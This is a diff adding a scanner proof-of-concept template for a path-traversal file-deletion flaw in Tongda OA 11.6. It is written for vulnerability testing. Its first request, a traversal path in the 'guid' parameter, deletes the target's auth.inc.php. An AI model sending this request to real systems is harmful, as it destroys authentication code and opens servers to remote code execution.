@@ -1,0 +1,19 @@
+name: poc-yaml-tongda-auth.inc.php-delete-rce
+rules:
+  - method: GET
+    path: /module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php
+    follow_redirects: false
+    expression: |
+      response.status == 200
+
+  - method: GET
+    path: /inc/auth.inc.php
+    follow_redirects: false
+    expression: |
+      response.status == 404 || response.body.bcontains(b"No input file specified")
+
+detail:
+  author: bo1349(https://github.com/bo1349)
+  influence_version: ' = 通达OA 11.6'
+  links:
+    - https://www.cnblogs.com/Cl0wn/p/13532582.html
